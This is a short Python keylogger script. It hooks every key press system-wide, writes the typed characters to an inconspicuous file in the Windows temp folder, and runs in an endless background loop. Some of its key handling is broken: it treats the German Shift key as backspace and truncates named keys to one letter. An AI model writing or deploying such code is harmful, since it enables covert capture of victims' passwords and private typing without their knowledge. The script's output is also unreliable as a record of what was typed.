import os
import keyboard
import time

# Define the filepath
txtfile = r"C:\windows\temp\test.txt"

# Check if the directory exists, if not, create it
directory = os.path.dirname(txtfile)
if not os.path.exists(directory):
    os.makedirs(directory)

# Create the text file
with open(txtfile, 'w') as file:
    pass  # Do nothing, just create an empty file

loop = True
count = 0

def on_key_press(event):
    
    key = event.name
    if key == "space":
        key = " "
    if key == "umschalt":
        key = "backspace"

    if key == "backspace":
        # Open the file in read mode to get its content
        with open(txtfile, 'r') as file:
            content = file.read()

        # Remove the last character from the content
        modified_content = content[:-1]

        # Open the file in write mode and write the modified content
        with open(txtfile, 'w') as file:
            file.write(modified_content)

    else:
        key = key[0]
        with open(txtfile, "a") as file:
            file.write(key)

# Register the on_key_press function to be called whenever a key is pressed
keyboard.on_press(on_key_press)

while loop:
    # Add a small delay to prevent the loop from consuming too much CPU
    time.sleep(0.1)
